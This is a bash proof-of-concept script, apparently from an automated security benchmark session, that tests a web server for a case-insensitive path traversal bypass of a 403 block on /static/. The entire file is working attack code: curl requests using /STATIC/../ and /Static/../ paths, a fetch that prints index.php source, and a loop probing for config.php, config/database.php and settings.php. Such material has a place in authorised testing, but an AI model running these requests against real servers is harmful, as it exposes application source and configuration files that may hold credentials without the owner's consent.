#!/bin/bash
# POC: Demonstrates case-insensitive path traversal bypass of /static/ directory access control by using uppercase, mixed-case directory names combined with path traversal sequences
# Target: ./repo
# Created: 2025-11-07T21:38:05.360Z
# Session: benchmark-XBEN-072-24-mhpdc97t

# Case-Insensitive Path Traversal Bypass POC
# Demonstrates that case variations of /static/ combined with traversal bypass 403 restrictions

TARGET_HOST="${1:-localhost:8080}"
echo "[*] Case-Insensitive Path Traversal Bypass POC"
echo "[*] Target: $TARGET_HOST"
echo ""

# Test 1: Access /static/ directly (should be 403)
echo "[Test 1] Standard /static/ access (should be 403 Forbidden)"
RESULT1=$(curl -s -o /dev/null -w "%{http_code}" "http://$TARGET_HOST/static/")
echo "Status Code: $RESULT1"
if [ "$RESULT1" = "403" ]; then
    echo "✓ Correctly blocked with 403 Forbidden"
else
    echo "✗ Unexpected status: $RESULT1"
fi
echo ""

# Test 2: Access /STATIC/ (uppercase - bypass attempt)
echo "[Test 2] Uppercase /STATIC/ access (bypass attempt)"
RESULT2=$(curl -s -o /dev/null -w "%{http_code}" "http://$TARGET_HOST/STATIC/")
echo "Status Code: $RESULT2"
if [ "$RESULT2" = "200" ] || [ "$RESULT2" = "403" ]; then
    echo "Status: $RESULT2"
fi
echo ""

# Test 3: Access /Static/ (mixed case - bypass attempt)
echo "[Test 3] Mixed case /Static/ access (bypass attempt)"
RESULT3=$(curl -s -o /dev/null -w "%{http_code}" "http://$TARGET_HOST/Static/")
echo "Status Code: $RESULT3"
if [ "$RESULT3" = "200" ] || [ "$RESULT3" = "403" ]; then
    echo "Status: $RESULT3"
fi
echo ""

# Test 4: Access /STATIC/../ (uppercase with traversal)
echo "[Test 4] Uppercase /STATIC/../ with path traversal (bypass attempt)"
RESULT4=$(curl -s -o /dev/null -w "%{http_code}" "http://$TARGET_HOST/STATIC/../")
echo "Status Code: $RESULT4"
if [ "$RESULT4" = "200" ]; then
    echo "✓ VULNERABILITY: Successfully bypassed 403 with case variation + traversal!"
else
    echo "Status: $RESULT4"
fi
echo ""

# Test 5: Access /Static/../ (mixed case with traversal)
echo "[Test 5] Mixed case /Static/../ with path traversal (bypass attempt)"
RESULT5=$(curl -s -o /dev/null -w "%{http_code}" "http://$TARGET_HOST/Static/../")
echo "Status Code: $RESULT5"
if [ "$RESULT5" = "200" ]; then
    echo "✓ VULNERABILITY: Successfully bypassed 403 with case variation + traversal!"
else
    echo "Status: $RESULT5"
fi
echo ""

# Test 6: Attempt to access files outside /static/ using case variation
echo "[Test 6] Accessing index.php via /STATIC/../index.php"
RESULT6=$(curl -s -o /dev/null -w "%{http_code}" "http://$TARGET_HOST/STATIC/../index.php")
echo "Status Code: $RESULT6"
if [ "$RESULT6" = "200" ]; then
    echo "✓ VULNERABILITY: Successfully accessed file outside /static/ directory!"
    echo ""
    echo "[*] File content sample:"
    curl -s "http://$TARGET_HOST/STATIC/../index.php" | head -20
else
    echo "Status: $RESULT6"
fi
echo ""

# Test 7: Try /Static/../config.php or other sensitive files
echo "[Test 7] Accessing potential config files via case variation"
for FILE in config.php config/database.php settings.php; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" "http://$TARGET_HOST/STATIC/../$FILE")
    if [ "$STATUS" = "200" ]; then
        echo "✓ Found accessible file: $FILE (Status: $STATUS)"
    fi
done
echo ""

echo "[*] Summary:"
if [ "$RESULT4" = "200" ] || [ "$RESULT5" = "200" ] || [ "$RESULT6" = "200" ]; then
    echo "VULNERABILITY CONFIRMED: Case-insensitive path traversal bypass is possible"
    exit 0
else
    echo "No vulnerability detected with the tested patterns"
    exit 1
fi